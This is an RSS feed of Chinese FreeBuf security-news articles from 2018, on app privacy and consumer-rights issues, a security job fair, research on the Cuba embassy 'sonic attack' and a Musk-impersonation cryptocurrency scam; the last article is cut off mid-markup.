<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:media="http://search.yahoo.com/mrss/">
<channel>
<title>FreeBuf</title>
<link>https://henix.github.io/feeds/zhuanlan.freebuf/</link>
<description>新鲜的安全资讯库，官网www.freebuf.com</description>
<language>zh-cn</language>
<lastBuildDate>Thu, 15 Mar 2018 17:59:44 +0800</lastBuildDate>
<item>
<title>315黑名单之夜，信息安全谁能逃过此劫？</title>
<link>https://henix.github.io/feeds/zhuanlan.freebuf/2018-03-15-34587092.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/34587092&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-d85922a34605dd4f63358fa7fde35a71_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;blockquote&gt;还有几个小时，315晚会就开始了，估计已经有一部分公司做好了预防自己中招的准备，公关团队+舆情监控系统蓄势待发，密切关注着315的一举一动，一旦有“万一”，第一时间做好公关工作，尽可能降低负面影响。&lt;/blockquote&gt;&lt;p&gt;&lt;b&gt;今年315晚会的主题是“品质消费，美好生活”，唤醒消费者权益意识，规范市场秩序依然是不变的宗旨。互联网已经深入人们的日常生活，与之相关的安全信息领域也逐渐成为315晚会重点关注对象。2017年的315晚会上，互动百科虚假广告、科视公司收集学生信息以及不安全的密码等消费预警。由此也可以发现，普通消费者对于个人隐私、信息保护等方面的安全意识比较薄弱，2017年依旧衍生了不少风波，又会有哪些案例或者公司成为315重点照顾对象呢？&lt;/b&gt;&lt;/p&gt;&lt;b&gt;&lt;u&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-9fdbac2f1e191f36a9e913d1b75ffcc4_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;403&quot;&gt;&lt;/u&gt;&lt;/b&gt;&lt;p&gt;FreeBuf作为关注互联网安全的媒体，本无意预测315晚会的曝光内容，只是借机315国际消费者权益日，让更多用户关注到信息安全，加强防范意识，同时避开一些消费陷阱。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;一、九成APP过度采集信息&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;智能手机已经人手不止一部，在方便日常沟通的同时也衍生了一些安全隐患，而更多的是来自手机APP。北京市消费者协会近日发布《手机APP个人信息安全调查通告》，调查结果显示，89.62%的人认为手机APP存在过度采集个人信息，79.32%的人认为手机APP上的个人信息并不安全，41.16%的人在安装或者使用手机APP之前从来吧屮授权须知。&lt;/p&gt;&lt;u&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-4b4aed706e5e0b8d45d71b8af8f4e74f_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;417&quot;&gt;&lt;/u&gt;&lt;p&gt;其中， 被手机APP采集最多的个人信息依次是联系方式、姓名和头像，而消费者最担心被采集的个人信息是身份证号和银行账号，害怕这些个人信息被采集后进行贩卖或者从事诈骗等活动。&lt;/p&gt;&lt;p&gt;而相关的投诉案件也越来越多，关注度最高的应该是江苏消保委起诉百度网讯科技有限公司一案，江苏消保委认为，“手机百度”、“百度浏览器”两款APP在消费者安装前，未告知其所获取的各种权限及目的，在未经过用户同意的情况下，获取诸如“监听电话、 定位、读取短彩信、读取联系人”等重要隐私权限。尽管后期事件因百度澄清之后渐渐平息，但却无法消除用户对手机APP擅自手机个人信息的担忧。&lt;/p&gt;&lt;blockquote&gt;监测数据认为，手机APP过度采集个人信息已经成为网络诈骗的主要源头之一。《消费者权益保护法》、《网络安全法》有明确规定，收集使用消费者个人信息， 应当遵循合法、正当、和必要的原则。尽管这一类规定中存在有一些不足需要完善， 但这并不妨碍此类事件成为今年315晚会的主题之一。&lt;/blockquote&gt;&lt;h2&gt;&lt;b&gt;二、时隔五年，苹果是否会再登315舞台？&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;2013年，苹果因“后盖门”和国内外售后政策不一的问题成为当年315晚会重点照顾对象。而这一年来，苹果遭遇的屡次负面事件（降频门和iCLoud隐私门），或许又将助力苹果重登315晚会舞台。&lt;/p&gt;&lt;u&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-03c642e35d6599f8aa8aa57e60e79cf7_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;431&quot;&gt;&lt;/u&gt;&lt;p&gt;去年底，iPhone降频门让苹果2017年的句点画的并不圆满。事件从国外论坛开始蔓延，用户发现旧款iPhone变卡的原因竟然是CPU降频了。而此后苹果也承认了这一事实，并表示设备性能下降是iOS升级后为保证老化电池续航时间和稳定而采取的新机制。&lt;/p&gt;&lt;u&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-8d26b11e27eebe5faf9ab13c5f100583_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;491&quot;&gt;&lt;/u&gt;&lt;p&gt;显然这种说法并没有能够说服消费者，在全球多个地方消费者就此事向法院提起诉讼。央视也多次披露这一情况，甚至上海消保委也要求苹果就此问题限期答复。&lt;/p&gt;&lt;p&gt;事件最终，苹果以较低的价格提供用户更换电池服务，并在随后的更新中去掉了降速机制并提供电池健康状况查询功能。&lt;/p&gt;&lt;p&gt;我国消费者权益保护法规定了消费者‘九大权利’，首要的就是知情权，没有知情权就无从作选择，没有选择权，更谈不上公平交易权。苹果降频门引发的轩然大波足以让其进入315重点照顾名单。&lt;/p&gt;&lt;p&gt;但苹果的麻烦显然还没有结束，前段时间网友曝出苹果技术顾问利用职权侵入其iCloud账户，并对其进行威胁恐吓。详情可参考FreeBuf此前的文章&lt;u&gt;&lt;a href=&quot;http://www.freebuf.com/articles/terminal/164447.html&quot;&gt;《细思极恐！苹果技术顾问私自窃取用户信息并恐吓威胁》&lt;/a&gt;&lt;/u&gt;。&lt;/p&gt;&lt;u&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-bbe6372c511675eeec307796ff98c789_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;460&quot;&gt;&lt;/u&gt;&lt;p&gt;尽管苹果很快进行了回应，但该用户iCloud账户是如何被入侵，个人信息泄露多少以及有无外泄等问题却没有得到理想的回复，苹果对此事也再无回应。此事涉及国内无数苹果用户的隐私安全问题，而苹果的态度却多少显得有些敷衍。&lt;/p&gt;&lt;p&gt;作为全球第一市值的科技公司，苹果在国内表现出的姿态却有些让人大失所望。至于会不会上榜315黑名单，还是看明天的结果吧。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;三、诱导、欺骗性推广现象泛滥&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;网络推广实属常见，而为了达到更可观的点击量而采用具有诱导、欺骗性质的方式，就有点不能接受了，然而这类行为依然泛滥，而绝大部分用户中招之后除了厌恶、反感之外并不会采取强硬的态度。&lt;/p&gt;&lt;p&gt;由火绒安全报告腾讯QQ推广腾讯电脑管家和QQ浏览器存在欺骗、诱导推广等类似病毒行为之后，我们也开始关注到其他的诱导、欺骗推广行为：&lt;/p&gt;&lt;h2&gt;&lt;b&gt;1.各大知名下载站&lt;/b&gt;&lt;/h2&gt;&lt;u&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-540b1cbb3bd6f5d5b8a8e0284d243e85_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;345&quot;&gt;&lt;/u&gt;&lt;u&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-a4f4d01699353c636a6cb52bd11ef025_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;600&quot; data-rawheight=&quot;400&quot;&gt;&lt;/u&gt;&lt;p&gt;Windows端没有有统一的应用商店也导致大量第三方下载站有机可乘，公然使用“XX高速下载”等字样吸引用户点击，但却不是直接下载应用，而是附带一堆捆绑选项的下载器，不仅严重影响用户体验，而且稍不留神就附带安装了捆绑推广的其他软件。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;2.已安装软件的弹窗推广&lt;/b&gt;&lt;/h2&gt;&lt;u&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-044c657f759aeecbb61921c546872557_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;645&quot; data-rawheight=&quot;434&quot;&gt;&lt;/u&gt;&lt;p&gt;如之前提到的腾讯QQ弹窗推广，其他部分软件也存在这一类诱导、欺诈性推广的行为，例如采用“清理加速”、“优化省电”、“高速上网”等字眼，用户点击之后则会提示下载其它家族软件。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;3.手机端也是重灾区&lt;/b&gt;&lt;/h2&gt;&lt;u&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-e6287131e16f9c535dee81034b9facae_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;613&quot;&gt;&lt;/u&gt;&lt;p&gt;除了PC端，安卓手机端也是这类诱导推广行为的重灾区。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;四、网络消费陷阱：“搭售”、“大数据杀熟”&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;互联网提供便利不可否认，但也要小心各种消费陷阱。“携程在手，看清楚再走”、“大数据杀熟”算是这一年来网络消费领域的一个热词。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;携程在手，看清楚再走&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;知名女艺人韩雪一句“携程在手，看清楚再走”一举登顶微博热搜榜，也揭露了网购机票领域的“搭售”行为，就是用户通过携程购买机票的时候会被默认选购多种保险、接送机优惠券等等项目，导致最终付费高于机票本身价格。&lt;/p&gt;&lt;u&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-e06d7eeffebf28eba9a436e80ca4d014_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;459&quot;&gt;&lt;/u&gt;&lt;p&gt;中消协也迅速关注这件事，律师表示这些行为损害了消费者知情权、自主选择权、公平交易权。这件事也让携程陷入前所未有的负面风波之中，另外包括携程、飞猪、去哪儿等OTA平台很快消除了这种“搭售”行为，但仍然有部分平台仍存在这一现象。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;大数据杀熟&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;比“搭售”行为更加让人深恶痛绝的应该是多个平台存在的“杀熟”行为，其代指的是一种网络商家对熟客给出的价格比普通用户要更高，在经济学角度称为价格欺诈。&lt;/p&gt;&lt;u&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-efbb76a60922a013546d7d68beb229e8_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;675&quot; data-rawheight=&quot;381&quot;&gt;&lt;/u&gt;&lt;p&gt;业内人士表示，“杀熟现象并不新鲜，自从大数据和只能广告被应用到电商领域便一直存在，甚至是说行业丑闻。”现在各行各业都在说大数据，像OTA平添、出行服务平台，一般注册用户量巨大，拥有大量的用户信息，根据大数据分析打造用户画像，提供不同的服务，而其中会有一种“价格不敏感”消费者则更容易成为“大数据杀熟”的对象。&lt;/p&gt;&lt;p&gt;所谓的大数据被用于此，可能是“大数据”一词被黑的最惨的一次吧。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;总结&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;每年的315晚会，无疑是国内影响力最大的消费黑榜，一旦上榜，“不死也重伤”可能是最好的形容。315晚会即将开幕，相信很多用户也会跟FreeBuf一样密切关注。文中提到的这些品牌及现象，在不同程度侵犯了消费者的某些权益，相信不少地区的消费者协会都关注到，相关企业的责任之外，更完善的法律法规以及监管措施同样迫在眉睫。如果让笔者选一个文中提到的最可能出现在315晚会上的案例，品牌上我会选择苹果，而手机APP收集个人信息问题概率也不小。&lt;/p&gt;&lt;p&gt;&lt;b&gt;*本文作者：Andy，转载请注明来自FreeBuf.COM&lt;/b&gt;&lt;/p&gt;</description>
<author>鲍弘捷</author>
<guid isPermaLink="false">2018-03-15-34587092</guid>
<pubDate>Thu, 15 Mar 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>错过等一年，中国首场信息安全垂直招聘来啦！</title>
<link>https://henix.github.io/feeds/zhuanlan.freebuf/2018-03-09-34392097.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/34392097&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-1bee43b81a06a3f90bab209d4d1c8551_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;中国首场信息安全垂直招聘——安全人才直升季重磅来袭！错过等一年！&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;活动网址：&lt;u&gt;&lt;a href=&quot;http://job.freebuf.com/activity/spring&quot;&gt;http://job.freebuf.com/activity/spring&lt;/a&gt;&lt;/u&gt;&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;活动时间：3月5日——4月30日&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;200+&lt;/b&gt;名企大咖入驻（腾讯、京东、科大讯飞、饿了么、知乎……），&lt;b&gt;400+&lt;/b&gt;信息安全相关职位虚位以待，职位涵盖从实习生到年薪百万的大牛岗位！&lt;/p&gt;&lt;p&gt;FreeBuf招聘站与众多求贤若渴、爱才如命的名企大佬们一起静候「佳人」。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;首场安全领域垂直招聘，内推直达名企&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;FreeBuf招聘站已联合腾讯、阿里、京东、微博、美团点评、知道创宇、深信服等百家优质企业，活动期间，求职简历将通过内推方式直达安全技术部门，简历情况当日反馈，求职快人一步。&lt;/p&gt;&lt;u&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-54a7c019cb0829075a4d6491e5461dfa_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;240&quot; data-rawheight=&quot;240&quot;&gt;&lt;/u&gt;&lt;h2&gt;&lt;b&gt;特色专场招聘，只为最优秀的你&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;「安全人才直升季」特别设立四大专场招聘——&lt;u&gt;&lt;a href=&quot;http://job.freebuf.com/activity/company/?model=famous&quot;&gt;「名企内推专场」&lt;/a&gt;&lt;/u&gt; &lt;u&gt;&lt;a href=&quot;http://job.freebuf.com/activity/company/?model=salary&quot;&gt;「高薪精英专场」&lt;/a&gt;&lt;a href=&quot;http://job.freebuf.com/activity/company/?model=safe&quot;&gt;「安全厂商专场」&lt;/a&gt;&lt;/u&gt; &lt;u&gt;&lt;a href=&quot;http://job.freebuf.com/activity/company/?model=intern&quot;&gt;「实习生专场」&lt;/a&gt;&lt;/u&gt;。无论你是初入社会寻找实习机会的小鲜肉、还是想百尺竿头更进一步的信息安全老司机，无论是甲方乙方，总有一款适合你。&lt;/p&gt;&lt;u&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-cba2d6a44f932a7126029bef4bde3e4b_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;607&quot; data-rawheight=&quot;334&quot;&gt;&lt;/u&gt;&lt;h2&gt;&lt;b&gt;FreeBuf招聘站全新升级，注册有礼&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;经过一段时间的公测运营，FreeBuf招聘站再一次优化升级——新增用户简历模板优化、简历预览、简历下载、职位分类、面试预约通知等功能，更多新的改变，期待各位Bufer的注册与挖掘。&lt;/p&gt;&lt;p&gt;与此同时，FreeBuf也为大家准备了注册好礼与FB职业发展奖励大礼包，奖励详情请猛戳&lt;u&gt;&lt;a href=&quot;http://job.freebuf.com/activity/spring&quot;&gt;http://job.freebuf.com/activity/spring&lt;/a&gt;&lt;/u&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;关注每位Bufer职业发展，FreeBuf带你扬帆起航&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;长久以来，FreeBuf始终关注信息安全人才的成长发展，除了更多优质的岗位，FreeBuf招聘站后续还将会为大家带来更多关于信息安全职业生涯规划探讨。&lt;/p&gt;&lt;p&gt;更多职位详情欢迎添加@FB招聘小助手（QQ：445467747）或点击（&lt;u&gt;&lt;a href=&quot;http://cn.mikecrm.com/mBZK37o&quot;&gt;http://cn.mikecrm.com/mBZK37o&lt;/a&gt;&lt;/u&gt;）告诉服妹你的故事，获得独家职位推荐。&lt;/p&gt;&lt;p&gt;加入&lt;u&gt;&lt;a href=&quot;http://job.freebuf.com/&quot;&gt;FreeBuf招聘站&lt;/a&gt;&lt;/u&gt;，你离升职加薪只差一次【投递简历】的距离！&lt;/p&gt;&lt;u&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-b6d4a07a1234cc2cb997ab9d8ea75305_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;1227&quot;&gt;&lt;/u&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>鲍弘捷</author>
<guid isPermaLink="false">2018-03-09-34392097</guid>
<pubDate>Fri, 09 Mar 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>美大使馆遭遇声波攻击，浙大WitAwards获奖团队协助调查</title>
<link>https://henix.github.io/feeds/zhuanlan.freebuf/2018-03-08-34338612.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/34338612&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-1372421327ca9fc4d4ed1caa86af14a6_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;h2&gt;&lt;b&gt;声波之谜&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;b&gt;根据外媒报道，至少 24 名美国驻古巴大使馆工作人员在 2016 年 12 月到 2017 年 8 月期间听到过尖锐声音，并受声波影响而受伤。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;2017 年 8 月，有报道称美国和加拿大驻古巴的外交官都换上了一些奇怪的疾病。有人猜测他们遭到高频声波武器攻击才患上这种病。然而，声学专家很快指出了这种攻击并不太可能。首先，超声波频率（20 千赫兹 – 200 千赫兹）不会在空气中繁殖，也不会导致大使馆所报告的耳痛、头痛、头晕等症状。 此外，一些受害者回忆起听到尖锐的声音，而人类并不能听到超声波。&lt;/p&gt;&lt;p&gt;10 月份，美联社（AP）发布了一个 6 秒的音频剪辑，据称是美国大使馆工作人员听到的声音录音，导致此事更加扑朔迷离。人们可以听到这种以 7kHz 为主的声音，但这种声音并不像是武器。&lt;/p&gt;&lt;p&gt;密歇根大学的计算机专家 Kevin Fu 看过 YouTube 上该音频的声波图之后，注意到了一些异常的涟漪状片段。他认为这可能就是问题所在。&lt;/p&gt;&lt;u&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-308258569235085b7b6080f3da759e76_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;562&quot; data-rawheight=&quot;306&quot;&gt;&lt;/u&gt;&lt;p&gt;Kevin 所在的实验室专门研究传感器、起搏器、RFID、自动驾驶汽车等 IoT 设备的安全问题。因为这些经验，Kevin 知道现代电子产品常常不按常理出牌，并且可以使用精心设计的声音或无线电干扰来有意或无意地人为操纵这些设备。因此，他认为声波图中的涟漪可能代表某种干扰。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;研究真相&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;Kevin 曾经与国内浙江大学教授徐文渊合作密切，这次他们一起讨论研究了美联社发布的这段片段，参与研究的还有徐文渊带的博士生闫琛。&lt;/p&gt;&lt;p&gt;据悉，徐文渊教授的实验室主要研究嵌入式安全，涉及使用超声波和无线电波来欺骗语音识别系统和自动驾驶汽车等领域。在 FreeBuf 主办的a href=&quot;http://www.freebuf.com/subject?hot=WitAwards%202017%20%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E5%B9%B4%E5%BA%A6%E8%AF%84%E9%80%89&quot;&amp;gt; WitAwards 2017  互联网安全年度评选中，徐文渊团队还获得了“年度安全团队”的美誉。&lt;/p&gt;&lt;u&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-af611042dda3f3906afeea8d63744a93_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;519&quot; data-rawheight=&quot;346&quot;&gt;&lt;/u&gt;&lt;p&gt;Kevin 认为这段声波是分谐波，并在遭到闫琛质疑时做了实验。而徐文渊和闫琛从音频中显示信号精确频率和幅度的快速傅里叶变换着手调查。然后，闫琛通过一系列的模拟，证明互调失真效应可能产生 AP 给出的这段声音。 两个频率不同的信号结合在一起，产生与原始频率有差值、总和或倍数关系的合成信号，这个过程中会发生互调失真。&lt;/p&gt;&lt;p&gt;当信号处理设备以非线性方式运行时，会导致这种类型的失真。例如，麦克风电路可以表现出非线性行为，并且通过空气传播的波也可以以非线性方式表现。 &lt;/p&gt;&lt;blockquote&gt;包含多个频率的声波穿过非线性系统时，人们可以在信号频谱中获得这些奇怪的波纹。同时，互调失真会产生比原始信号频率更低的信号。也就是说，通过空气传播的无声超声波可以产生听得见的声音。&lt;/blockquote&gt;&lt;u&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-74ebe09c4e3daa1c228fdaf8f2f9a6ea_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;560&quot; data-rawheight=&quot;298&quot;&gt;&lt;/u&gt;&lt;p&gt;他们继续在实验室中进行模拟，使用两个超声波扬声器，一个发出 25 kHz 的信号，另一个发出 32 kHz 的信号。将这两个信号交叉就会产生 7kHz 的高音。7kHz 的频率相当于两个超声波扬声器之间的频率差，并且与 AP 公布的音频频率相同。为了致敬网络爆红的“rickrolling”现象，闫琛还将超声波版本的 Rick Astley 歌曲“Never Gonna Give Up Up”，两个信号交叉处可以听到。&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://v.qq.com/x/page/a0101vu1zcu.html&quot;&gt;利用超声载体传输歌曲视频&lt;/a&gt;&lt;/p&gt;&lt;p&gt;三位研究员在逆向 AP 发布音频后，也研究了形成影响美国驻古巴大使馆的声音的超声波组合。 &lt;/p&gt;&lt;blockquote&gt;如果一定要说罪魁祸首是超声波的话，那么可能的原因是两个超声波信号意外地相互干扰，产生可听见的声音，造成了副作用。&lt;/blockquote&gt;&lt;p&gt;办公室环境中原本就存在超声波来源，例如室内占位传感器（可参见文章&lt;u&gt;&lt;a href=&quot;https://spectrum.ieee.org/semiconductors/devices/finally-a-likely-explanation-for-the-sonic-weapon-used-at-the-us-embassy-in-cuba/how-an-ultrasonic-sensor-nearly-derailed-a-phd-thesis&quot;&gt;《超声波传感器如何毁掉一篇博士论文》&lt;/a&gt;&lt;/u&gt;）。 &lt;/p&gt;&lt;blockquote&gt;也许房间里还有一台超声波干扰器和一台超声波发射器，因为有的工作人员没有意识到另一台设备的存在，就把其中一台设备放在了办公室。&lt;/blockquote&gt;&lt;u&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-fe1ae2e39a79caa1abcac17a7b9438d7_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;643&quot; data-rawheight=&quot;214&quot;&gt;&lt;/u&gt;&lt;p&gt;不过这项调查没有研究美联社发布的这段音频是否真的会让人产生各种各样的症状，包括使大使馆工作人员受到的脑损伤。Kevin 表示，已知声音信号会引起疼痛，但并没有看到除此之外的的生理影响。&lt;/p&gt;&lt;p&gt;目前，联邦调查局尚未公布调查结果。不过，一些古巴科学家和医生认为，由压力引起的“集体心理障碍”也可能导致使馆工作人员出现一些身体症状。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;声波攻击研究——针对创造性事件的创造性研究&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;麻省理工学院一名专门研究无线传感和通信技术的教授 Fadel Adib 认为，这项研究是一项“对创造性事件进行的创造性研究”。Adib 没有参与这项研究，但对结果进行了审查，他认为无线信号确实可以相互作用。 &lt;/p&gt;&lt;blockquote&gt;如果发生这种情况，你会听到你原本不能听到的信号。在所有的推测中，这项研究结果是最合理的，在技术上也可能实现。&lt;/blockquote&gt;&lt;p&gt;Kevin 对于研究结果也很谨慎：幕后黑手可能并不是为了使用声波做武器发动攻击，而是在做工程技术，只不过技术比较烂（才造成这种后果）。&lt;/p&gt;&lt;p&gt;&lt;b&gt;*参考来源：&lt;u&gt;&lt;a href=&quot;https://spectrum.ieee.org/semiconductors/devices/finally-a-likely-explanation-for-the-sonic-weapon-used-at-the-us-embassy-in-cuba&quot;&gt;spectrum&lt;/a&gt;&lt;/u&gt;，AngelaY 编译整理，转载请注明来自 FreeBuf.COM。&lt;/b&gt;&lt;/p&gt;</description>
<author>鲍弘捷</author>
<guid isPermaLink="false">2018-03-08-34338612</guid>
<pubDate>Thu, 08 Mar 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>朋友圈被马斯克刷屏？社工骗子已经下手了</title>
<link>https://henix.github.io/feeds/zhuanlan.freebuf/2018-02-08-33687564.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/33687564&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-f8a8cf7031e189e0abb9020efb88afbc_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;blockquote&gt;几小时前，在数十万观众的注视下，人类现役运力最强的火箭 SpaceX “重型猎鹰”首飞成功，传奇人物马斯克再次成为万众瞩目的焦点。不论是在国外的 Twitter 上还是国内的微信朋友圈，相关新闻已经刷爆了。&lt;/blockquote&gt;&lt;u&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-6484eecbebf17f5cc51b0353c88f1922_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;503&quot; data-rawheight=&quot;252&quot;&gt;&lt;/u&gt;&lt;p&gt;&lt;b&gt;可以说，这是马斯克参与的一次“太空级”大 show。在火箭发射前一天，马斯克的 Twitter 就不断刷屏，让很多粉丝都激动不已。在大消息面前，很多人都容易“得意”忘形，失去警惕。而手法娴熟的社工大佬，正是抓住了这个机会，小赚了一笔。&lt;/b&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;戏精社工套路多&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;在马斯克的一条推文下面，出现了两个山寨账号，不停地刷评论，表明自己将给粉丝发放几百个以太币，前提是每个粉丝先转一定量的以太币到指定的钱包地址，收到粉丝转账后，会按照 10 倍返还。&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-c3a033bd24cd525979b59c730f937912_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;588&quot; data-rawheight=&quot;764&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-9d35d6d049af8127861b283e07b7f4e8_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;583&quot; data-rawheight=&quot;678&quot;&gt;&lt;p&gt;乍看之下，这两个账号跟马斯克本人的 Twitter 头像和昵称都一样，但仔细一看，用户名其实是高仿。马斯克本人的用户名是 @elonmusk，而这两个骗子的用户名则分别是 @eloonmusk 和 @elonnmuusk，此外，加入Twitter 的时间和定位地点、公司信息等都不一样，稍加留意，还是能区别开来。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-8d259238b270ca691f55b5e27661cf6e_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;266&quot; data-rawheight=&quot;379&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-7ca181b6bf7c4e466fd04f703246b41e_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;268&quot; data-rawheight=&quot;379&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-c9058fe8ccd4f9afc0169d94b955f76c_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;266&quot; data-rawheight=&quot;379&quot;&gt;&lt;p&gt;从左到右依次为：马斯克本人、高仿号1、高仿号2&lt;/p&gt;&lt;p&gt;目前，已经有很多人识别出这个诈骗伎俩，并在其评论中回复“诈骗信息”，提醒其他读者注意。但是，查询该山寨账号留下的以太币钱包地址，发现其钱包中已经有了 4.709 的以太币余额，价值约 3500 美元。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-2d5345642f150d586f892dce7062d5bb_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;588&quot; data-rawheight=&quot;665&quot;&gt;&lt;p&gt;网友提醒&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-cf8521edfddaf1a3141a2e8db0120f0a_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;690&quot; 